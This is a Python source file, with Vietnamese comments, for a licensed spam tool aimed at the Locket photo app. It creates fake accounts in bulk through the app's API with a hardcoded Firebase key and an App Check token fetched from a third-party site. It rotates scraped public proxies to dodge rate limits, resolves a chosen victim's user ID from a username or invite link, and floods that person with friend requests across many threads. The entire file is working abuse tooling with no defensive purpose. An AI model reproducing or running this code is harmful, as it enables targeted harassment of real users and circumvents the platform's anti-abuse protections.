# spammer.py (phiên bản 2.3 - Sửa lỗi find_locket_uid nâng cao)
import requests
import re
import random
import string
import threading
import time
import queue
from typing import Optional, Callable
from keygen import validate_key as validate_license_from_file

# Lớp Spammer không thay đổi
class Spammer:
    # ... dán toàn bộ nội dung lớp Spammer từ phiên bản 2.2 vào đây ...
    def __init__(self, proxy: str, target_uid: str, custom_name: str):
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.REQUEST_TIMEOUT = 15
        self.proxy_str, self.proxies_dict = proxy, self._format_proxy(proxy)
        self.target_uid, self.custom_name = target_uid, custom_name
        self.session = requests.Session()
        self.session.proxies = self.proxies_dict
        self.firebase_app_check = SpamManager.FIREBASE_APP_CHECK_TOKEN
        self.id_token, self.local_id = None, None
        
    def _format_proxy(self, proxy_str):
        if not proxy_str: return None
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str = f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}

    def _rand_str(self, length=10, chars=string.ascii_lowercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(length))

    def _create_account(self):
        email, password = f"{self._rand_str(15)}@thanhdieu.com", 'zlocket' + self._rand_str(7)
        payload, headers = {"data":{"email":email,"password":password,"client_email_verif":True,"platform":"ios"}}, {'Content-Type':'application/json','X-Firebase-AppCheck':self.firebase_app_check}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return (email, password) if res.status_code == 200 else (None, None)
        except: return None, None
            
    def _sign_in(self, email, password):
        payload, headers = {"email":email,"password":password,"returnSecureToken":True}, {'Content-Type':'application/json','X-Firebase-AppCheck':self.firebase_app_check}
        try:
            res = self.session.post(f"{self.FIREBASE_AUTH_URL}/verifyPassword?key={self.FIREBASE_API_KEY}", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200 and 'idToken' in res.json():
                self.id_token, self.local_id = res.json()['idToken'], res.json()['localId']
                return True
        except: pass
        return False
            
    def _finalize_user(self):
        payload, headers = {"data":{"username":self._rand_str(8,string.ascii_lowercase),"last_name":"✨","first_name":self.custom_name[:20]}}, {'Content-Type':'application/json','Authorization':f'Bearer {self.id_token}'}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/finalizeTemporaryUser", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return res.status_code == 200
        except: return False

    def _send_friend_request(self):
        payload, headers = {"data":{"user_uid":self.target_uid,"source":"signUp"}}, {'Content-Type':'application/json','Authorization':f'Bearer {self.id_token}'}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/sendFriendRequest", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return res.status_code == 200
        except: return False
            
    def run_cycle(self):
        if not self.firebase_app_check: return "failed", 0
        email, password = self._create_account()
        if not email: return "failed", 0
        if not self._sign_in(email, password): return "failed", 0
        if not self._finalize_user(): return "failed", 0
        sent_count = sum(1 for _ in range(16) if self._send_friend_request())
        return ("success", sent_count) if sent_count > 0 else ("failed", 0)

# Lớp quản lý chính
class SpamManager:
    FIREBASE_APP_CHECK_TOKEN = None

    def __init__(self):
        # ... Phần __init__ giữ nguyên
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.PROXY_APIS = [
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=20000&country=all&ssl=all&anonymity=all',
        ]
        self.active_spam_sessions = {}
        self.proxy_queue = queue.Queue()

    def _ensure_dependencies(self) -> bool:
        # ... Phần _ensure_dependencies giữ nguyên
        if not SpamManager.FIREBASE_APP_CHECK_TOKEN:
            print("[INFO] Đang lấy Firebase App Check token...")
            SpamManager.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
            if not SpamManager.FIREBASE_APP_CHECK_TOKEN: return False
            print("[INFO] App Check Token đã sẵn sàng.")
        if self.proxy_queue.empty():
            print("[INFO] Hàng đợi proxy trống, đang tải proxies mới...")
            if self._load_proxies() == 0: return False
            print("[INFO] Proxies đã sẵn sàng.")
        return True

    def _fetch_app_check_token(self):
        # ... Phần _fetch_app_check_token giữ nguyên
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=15)
            return res.json().get("data", {}).get("token") if res.status_code == 200 else None
        except requests.RequestException: return None
    
    def _load_proxies(self):
        # ... Phần _load_proxies giữ nguyên
        proxies = set()
        try:
            with open('proxy.txt', 'r') as f: proxies.update(p.strip() for p in f if p.strip())
        except FileNotFoundError: pass
        for url in self.PROXY_APIS:
            try:
                res = requests.get(url, timeout=15); res.raise_for_status()
                proxies.update(p.strip() for p in res.text.splitlines() if p.strip())
            except requests.RequestException: pass
        proxy_list = list(proxies); random.shuffle(proxy_list)
        for p in proxy_list: self.proxy_queue.put(p)
        return len(proxy_list)
    
    def validate_license(self, key: str) -> dict:
        return validate_license_from_file(key)

    # === CHANGED === Hàm find_locket_uid được viết lại hoàn toàn để thông minh hơn ===
    def find_locket_uid(self, user_input: str) -> Optional[str]:
        """
        Tìm Locket UID từ nhiều loại URL (username, /invites/, /links/)
        bằng cách kiểm tra redirect, sau đó phân tích nội dung HTML.
        """
        user_input = user_input.strip()
        url_to_check = f"https://locket.cam/{user_input}" if not re.match(r'^https?://', user_input) else user_input
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
        }
        
        try:
            # Bước 1: Gửi request và cho phép tự động theo các chuyển hướng HTTP
            response = requests.get(url_to_check, headers=headers, timeout=15, allow_redirects=True)
            response.raise_for_status()

            # Bước 2: Kiểm tra URL cuối cùng sau khi đã chuyển hướng.
            # Đây là cách hiệu quả nhất nếu server trả về 301/302 redirect.
            final_url = response.url
            invite_match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', final_url)
            if invite_match:
                # print(f"[DEBUG] UID tìm thấy từ URL cuối cùng: {final_url}")
                return invite_match.group(1)

            # Bước 3: Nếu URL cuối cùng không phải là link invite,
            # hãy phân tích nội dung HTML để tìm link ẩn.
            # Link có thể nằm trong thẻ meta (og:url), thẻ a (href), hoặc thẻ meta cho App Store.
            html_content = response.text
            html_match = re.search(r'(https?://locket\.camera/invites/[a-zA-Z0-9]{28})', html_content)
            if html_match:
                # print(f"[DEBUG] UID tìm thấy từ phân tích nội dung HTML.")
                return re.search(r'([a-zA-Z0-9]{28})', html_match.group(1)).group(1)
            
            # Nếu tất cả đều thất bại, trả về None
            return None

        except requests.RequestException as e:
            # print(f"[DEBUG] Lỗi RequestException: {e}")
            return None


    def start_spam_session(self, user_id: int, target: str, custom_name: str, num_threads: int, update_callback: Callable):
        # ... Phần này giữ nguyên
        if user_id in self.active_spam_sessions:
            return update_callback(status="error", message="Bạn đã có một phiên spam đang chạy.")
        if not self._ensure_dependencies():
            return update_callback(status="error", message="Không thể khởi động: Thiếu token hoặc proxy. Kiểm tra logs.")
        target_uid = self.find_locket_uid(target)
        if not target_uid:
            return update_callback(status="error", message=f"Không thể tìm thấy Locket UID từ `{target}`.")
        
        stop_event = threading.Event()
        self.active_spam_sessions[user_id] = stop_event
        proxies_count = self.proxy_queue.qsize()
        actual_threads = min(num_threads, proxies_count)
        stats = {'accounts':0, 'requests':0, 'failed':0, 'start_time':time.time(), 'proxies':proxies_count}

        def spam_loop():
            worker_threads = [threading.Thread(target=self._run_worker, args=(target_uid, custom_name, stop_event, stats)) for _ in range(actual_threads)]
            for t in worker_threads: t.start()
            if not worker_threads: return update_callback(status="error", message="Không có luồng nào được tạo.")
            
            last_update_time = time.time()
            while not stop_event.is_set() and any(t.is_alive() for t in worker_threads):
                if time.time() - last_update_time > 2:
                    stats['proxies'] = self.proxy_queue.qsize()
                    update_callback(status="running", stats=stats)
                    last_update_time = time.time()
                time.sleep(0.5)

            for t in worker_threads: t.join()
            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions: del self.active_spam_sessions[user_id]
        
        threading.Thread(target=spam_loop, daemon=True).start()
        update_callback(status="started", message=f"✅ Đã bắt đầu spam đến `{target_uid}` với **{actual_threads}** luồng.")
        
    def _run_worker(self, target_uid, custom_name, stop_event, stats):
        # ... Phần này giữ nguyên
        while not stop_event.is_set():
            try:
                proxy = self.proxy_queue.get_nowait()
                spammer_instance = Spammer(proxy, target_uid, custom_name)
                status, sent_count = spammer_instance.run_cycle()
                with threading.Lock():
                    if status == "success": stats['accounts'] += 1; stats['requests'] += sent_count
                    else: stats['failed'] += 1
                self.proxy_queue.put(proxy)
            except queue.Empty: break

    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions:
            self.active_spam_sessions[user_id].set(); return True
        return False
